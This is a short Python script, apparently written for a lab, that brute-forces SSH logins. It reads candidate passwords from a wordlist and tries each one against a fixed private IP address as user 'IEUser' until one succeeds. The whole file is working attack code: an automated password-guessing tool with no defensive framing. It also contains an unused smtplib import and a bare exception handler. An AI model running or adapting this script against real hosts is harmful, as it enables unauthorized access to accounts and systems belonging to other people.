#!/usr/bin/env python3
import time
import paramiko
import smtplib

def brute():
    filepath=open("./passwordlist.txt")
    ssh=paramiko.SSHClient()
    for i in filepath.readlines():
        secret=i.strip("\n")
        try:
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect('192.168.0.60', username="IEUser", password=secret)
            return secret

        except:
            time.sleep(1)
            print(secret)

    


brute()